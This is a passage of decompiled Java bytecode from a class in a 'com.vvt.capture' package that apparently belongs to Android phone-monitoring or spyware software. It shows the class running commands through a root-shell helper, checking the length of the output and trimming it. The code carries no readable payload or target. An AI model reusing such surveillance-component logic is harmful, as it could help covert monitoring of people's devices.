    //   159: invokestatic 128	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   162: astore 5
    //   164: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   167: istore 8
    //   169: iload 8
    //   171: ifeq +3 -> 174
    //   174: ldc_w 484
    //   177: astore 6
    //   179: iconst_3
    //   180: istore 9
    //   182: iload 9
    //   184: anewarray 4	java/lang/Object
    //   187: astore 10
    //   189: aload 10
    //   191: iconst_0
    //   192: aload_2
    //   193: aastore
    //   194: iconst_1
    //   195: istore 7
    //   197: aload 10
    //   199: iload 7
    //   201: aload 5
    //   203: aastore
    //   204: iconst_2
    //   205: istore 7
    //   207: aload 10
    //   209: iload 7
    //   211: aload_3
    //   212: aastore
    //   213: aload 6
    //   215: aload 10
    //   217: invokestatic 123	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   220: astore_2
    //   221: aload_2
    //   222: invokestatic 128	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   225: astore_2
    //   226: getstatic 37	com/vvt/capture/d/a/a:a	Z
    //   229: istore 11
    //   231: iload 11
    //   233: ifeq +3 -> 236
    //   236: aload_2
    //   237: invokevirtual 487	java/lang/String:length	()I
    //   240: istore 11
    //   242: bipush 45
    //   244: istore 4
    //   246: iload 11
    //   248: iload 4
    //   250: if_icmplt -199 -> 51
    //   253: aload_2
    //   254: invokevirtual 487	java/lang/String:length	()I
    //   257: istore 11
    //   259: bipush 50
    //   261: istore 4
    //   263: iload 11
    //   265: iload 4
    //   267: if_icmpgt -216 -> 51
    //   270: ldc_w 491
    //   273: astore_3
    //   274: aload_2
    //   275: aload_3
    //   276: invokevirtual 495	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   279: istore 11
    //   281: iconst_0
    //   282: istore 4
    //   284: aconst_null
    //   285: astore 5
    //   287: aload_2
    //   288: iconst_0
    //   289: iload 11
    //   291: invokevirtual 499	java/lang/String:substring	(II)Ljava/lang/String;
    //   294: astore_1
    //   295: goto -244 -> 51
    //   298: getstatic 45	com/vvt/capture/d/a/a:MyUncaughtExceptionHandler	Z
    //   301: istore 7
    //   303: iload 7
    //   305: ifeq -254 -> 51
    //   308: goto -257 -> 51
    //   311: astore_2
    //   312: getstatic 45	com/vvt/capture/d/a/a:MyUncaughtExceptionHandler	Z
    //   315: istore 7
    //   317: iload 7
    //   319: ifeq -268 -> 51
    //   322: goto -271 -> 51
    //   325: astore_1
    //   326: aload_0
    //   327: invokespecial 474	com/vvt/capture/d/a/a:s	()V
    //   330: aload_1
    //   331: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	332	0	this	a
    //   2	293	1	str1	String
    //   325	6	1	localObject1	Object
    //   7	281	2	str2	String
    //   311	1	2	localObject2	Object
    //   12	264	3	str3	String
    //   16	108	4	bool1	boolean
    //   244	39	4	i1	int
    //   27	259	5	localObject3	Object
    //   32	182	6	localObject4	Object
    //   44	156	7	bool2	boolean
    //   205	5	7	i2	int
    //   301	17	7	bool3	boolean
    //   116	54	8	bool4	boolean
    //   180	3	9	i3	int
    //   187	29	10	arrayOfObject	Object[]
    //   229	3	11	bool5	boolean
    //   240	50	11	i4	int
    // Exception table:
    //   from	to	target	type
    //   23	27	311	finally
    //   29	32	311	finally
    //   41	44	311	finally
    //   57	60	311	finally
    //   64	68	311	finally
    //   68	73	311	finally
    //   80	83	311	finally
    //   90	95	311	finally
    //   95	98	311	finally
    //   102	106	311	finally
    //   106	111	311	finally
    //   113	116	311	finally
    //   141	145	311	finally
    //   147	150	311	finally
    //   157	162	311	finally
    //   164	167	311	finally
    //   182	187	311	finally
    //   192	194	311	finally
    //   201	204	311	finally
    //   211	213	311	finally
    //   215	220	311	finally
    //   221	225	311	finally
    //   226	229	311	finally
    //   236	240	311	finally
    //   253	257	311	finally
    //   275	279	311	finally
    //   289	294	311	finally
    //   298	301	311	finally
    //   312	315	325	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/d/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */